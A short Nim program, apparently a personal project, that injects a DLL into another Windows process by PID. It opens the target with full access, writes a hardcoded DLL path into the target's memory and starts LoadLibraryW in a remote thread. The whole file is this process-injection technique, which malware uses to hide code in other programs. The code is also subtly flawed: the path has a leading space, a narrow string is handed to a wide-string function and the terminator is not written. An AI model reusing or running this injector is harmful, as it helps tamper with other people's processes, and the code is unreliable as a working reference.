# Nim DLL injector
# Author: Jakob Friedl
# Created on: Thu, 02 Nov. 2023

import winim
import os
import strformat, strutils

# Status indicators
template okay(s: varargs[untyped]): untyped = 
  echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
  echo "[-] ", s
template info(s: varargs[untyped]): untyped =
  echo "[*] ", s

proc inject(): int = 
  
  let dll_path = " C:\\.Jakob\\Other\\mini-projects\\nim\\dll_inject\\src\\mkdll.dll" 

  info("Getting PID of process to inject into")
  if paramCount() < 1:
    fail(fmt"Usage: {paramStr(0)} <process>")
    return ERROR
  
  var pid: DWORD = (DWORD)paramStr(1).parseInt
  
  var hProcess: HANDLE
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
  if hProcess == 0:
    fail(fmt"Failed to get handle to process {pid}")
    return ERROR
  okay(fmt"Got handle to process {pid}: 0x{hProcess}")

  var hKernel32: HMODULE = 0
  info("Getting handle to kernel32.dll")
  hKernel32 = GetModuleHandleW(L"kernel32.dll")
  if hKernel32 == 0:
    fail("Failed to get handle to kernel32.dll")
    return ERROR
  okay(fmt"Got handle to kernel32.dll: 0x{hKernel32}")

  var addrLoadLibrary: LPTHREAD_START_ROUTINE = nil
  info("Getting address of LoadLibraryW")
  addrLoadLibrary = cast[LPTHREAD_START_ROUTINE](GetProcAddress(hKernel32, "LoadLibraryW".LPCSTR))
  if addrLoadLibrary == nil:
    fail("Failed to get address of LoadLibraryW")
    return ERROR
  okay(fmt"Got address of LoadLibraryW")

  info("Allocating memory in target process")
  var rBuffer = VirtualAllocEx(hProcess, nil, 0x1000, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if rBuffer == nil:
    fail("Failed to allocate memory in target process")
    return ERROR
  okay(fmt"Allocated memory in target process")

  info("Writing to allocated buffer")
  var bytesWritten: SIZE_T = 0
  WriteProcessMemory(hProcess, rBuffer, winstrConverterStringToPtrChar(dll_path), dll_path.len, &bytesWritten)
  if bytesWritten != dll_path.len:
    fail("Failed to write to allocated buffer")
    return ERROR
  okay(fmt"Wrote {bytesWritten} bytes to allocated buffer")

  info("Creating remote thread")
  var hThread: HANDLE = 0

  hThread = CreateRemoteThread(hProcess, nil, 0, addrLoadLibrary, rBuffer, 0, nil)
  if hThread == 0:
    fail("Failed to create remote thread")
    return ERROR
  okay(fmt"Created remote thread: 0x{hThread}")

  info("Waiting for remote thread to finish")
  WaitForSingleObject(hThread, INFINITE)

  # Cleanup
  if hProcess != 0:
    CloseHandle(hProcess)
    okay(fmt"Closed handle to process {pid}")

  if hThread != 0:
    CloseHandle(hThread)
    okay(fmt"Closed handle to thread 0x{hThread}")

  return SUCCESS

when isMainModule:
  discard inject()